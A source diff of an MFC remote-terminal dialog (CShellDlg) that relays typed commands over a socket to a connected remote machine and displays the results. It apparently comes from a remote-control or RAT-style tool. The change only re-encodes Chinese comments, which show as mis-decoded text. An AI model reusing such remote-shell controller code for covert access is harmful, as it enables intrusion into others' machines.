@@ -55,7 +55,7 @@ BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 	// TODO: Add your specialized code here and/or call the base class
 	if (pMsg->message == WM_KEYDOWN)
 	{
-		// ÆÁ±ÎVK_ESCAPE¡¢VK_DELETE
+		// å±è”½VK_ESCAPEã€VK_DELETE
 		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
 			return true;
 
@@ -68,19 +68,19 @@ BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
 			m_iocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);
 			m_nCurSel = m_edit.GetWindowTextLength();
 		}
-		// ÏŞÖÆVK_BACK
+		// é™åˆ¶VK_BACK
 		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
 		{
 			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
 				return true;
 		}
  	}
-	// CtrlÃ»°´ÏÂ
+	// Ctrlæ²¡æŒ‰ä¸‹
 	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
 	{
 		int	len = m_edit.GetWindowTextLength();
 		m_edit.SetSel(len, len);
-		// ÓÃ»§É¾³ıÁË²¿·ÖÄÚÈİ£¬¸Ä±äm_nCurSel
+		// ç”¨æˆ·åˆ é™¤äº†éƒ¨åˆ†å†…å®¹ï¼Œæ”¹å˜m_nCurSel
 		if (len < m_nCurSel)
 			m_nCurSel = len;
 	}
@@ -103,12 +103,12 @@ BOOL CShellDlg::OnInitDialog()
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-	str.Format("\\\\%s - Ô¶³ÌÖÕ¶Ë", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
+	str.Format("\\\\%s - è¿œç¨‹ç»ˆç«¯", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
 	SetWindowText(str);
 
-	m_edit.SetLimitText(MAXDWORD); // ÉèÖÃ×î´ó³¤¶È
+	m_edit.SetLimitText(MAXDWORD); // è®¾ç½®æœ€å¤§é•¿åº¦
 
-	// Í¨ÖªÔ¶³Ì¿ØÖÆ¶Ë¶Ô»°¿òÒÑ¾­´ò¿ª
+	// é€šçŸ¥è¿œç¨‹æ§åˆ¶ç«¯å¯¹è¯æ¡†å·²ç»æ‰“å¼€
 	BYTE bToken = COMMAND_NEXT;
 	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
 
@@ -116,6 +116,7 @@ BOOL CShellDlg::OnInitDialog()
 	              // EXCEPTION: OCX Property Pages should return FALSE
 }
 
+//å°‡å¾socketæ¥æ”¶çš„è¨Šæ¯æ”¾å…¥ç·¨è¼¯æ¡†ï½
 void CShellDlg::OnReceiveComplete()
 {	
 	AddKeyBoardData();
@@ -124,7 +125,7 @@ void CShellDlg::OnReceiveComplete()
 
 void CShellDlg::AddKeyBoardData()
 {
-	// ×îºóÌîÉÏ0
+	// æœ€åå¡«ä¸Š0
 	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
 	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
 
@@ -173,7 +174,7 @@ void CShellDlg::OnChangeEdit()
 	// with the ENM_CHANGE flag ORed into the mask.
 	
 	// TODO: Add your control notification handler code here
-	// ÓÃ»§É¾³ıÁË²¿·ÖÄÚÈİ£¬¸Ä±äm_nCurSel
+	// ç”¨æˆ·åˆ é™¤äº†éƒ¨åˆ†å†…å®¹ï¼Œæ”¹å˜m_nCurSel
 	int len = m_edit.GetWindowTextLength();
 	if (len < m_nCurSel)
 		m_nCurSel = len;
@@ -184,10 +185,10 @@ HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
 	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
 	{
 		COLORREF clr = RGB(255, 255, 255);
-		pDC->SetTextColor(clr);   //ÉèÖÃ°×É«µÄÎÄ±¾
+		pDC->SetTextColor(clr);   //è®¾ç½®ç™½è‰²çš„æ–‡æœ¬
 		clr = RGB(0,0,0);
-		pDC->SetBkColor(clr);     //ÉèÖÃºÚÉ«µÄ±³¾°
-		return CreateSolidBrush(clr);  //×÷ÎªÔ¼¶¨£¬·µ»Ø±³¾°É«¶ÔÓ¦µÄË¢×Ó¾ä±ú
+		pDC->SetBkColor(clr);     //è®¾ç½®é»‘è‰²çš„èƒŒæ™¯
+		return CreateSolidBrush(clr);  //ä½œä¸ºçº¦å®šï¼Œè¿”å›èƒŒæ™¯è‰²å¯¹åº”çš„åˆ·å­å¥æŸ„
 	}
 	else
 	{
